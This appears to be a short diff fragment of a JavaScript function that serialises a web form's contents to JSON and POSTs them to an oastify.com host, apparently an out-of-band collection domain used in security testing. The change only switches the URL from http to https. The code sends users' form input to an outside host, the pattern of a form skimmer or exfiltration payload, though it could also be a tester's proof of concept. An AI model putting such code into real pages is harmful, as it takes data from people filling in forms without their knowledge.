@@ -32,7 +32,7 @@ function sendFormData(formElement) {
     console.log('Sending data:', jsonData); // Log the data being sent
 
     // Your fetch request
-    fetch('http://gi2zxgb9mz9eawl5yzg5k2b02r8iw8kx.oastify.com/', {
+    fetch('https://gi2zxgb9mz9eawl5yzg5k2b02r8iw8kx.oastify.com/', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
